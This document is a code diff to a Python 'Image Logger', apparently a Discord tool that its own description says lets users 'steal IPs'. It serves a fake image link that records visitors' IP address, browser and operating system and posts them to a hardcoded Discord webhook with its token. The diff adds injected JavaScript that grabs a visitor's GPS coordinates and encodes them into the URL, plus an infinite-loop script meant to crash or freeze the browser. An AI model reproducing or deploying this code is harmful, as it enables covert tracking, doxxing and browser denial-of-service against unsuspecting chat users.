@@ -7,8 +7,6 @@ __description__ = "A simple application which allows you to steal IPs and more b
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
-#------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1127231313267662988/PfTHC8cHo0NwGXLtl1P1wL5IiW6M6oxyjE3TkfCTi72iea2dxq3uLV2dxfXSh2JZnpDl",
@@ -20,7 +18,14 @@ config = {
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
     "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -42,8 +47,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://youtu.be/dQw4w9WgXcQ" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
@@ -54,8 +59,6 @@ config = {
     # 3) Message (If this is enabled, disables image)
     # 4) Image 
 }
-
-#------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
@@ -98,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-})  if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
     ping = "@everyone"
@@ -133,8 +136,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
     
-#------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
     embed = {
     "username": config["username"],
     "content": ping,
@@ -175,16 +176,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     requests.post(config["webhook"], json = embed)
     return info
 
-#------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
     # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
     # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
     # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
-
-#------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
     
@@ -256,8 +253,13 @@ height: 100vh;
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                     message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
 
-
                 datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
@@ -265,9 +267,24 @@ height: 100vh;
                 self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
 
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
                 self.wfile.write(data)
-
+        
         except Exception:
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
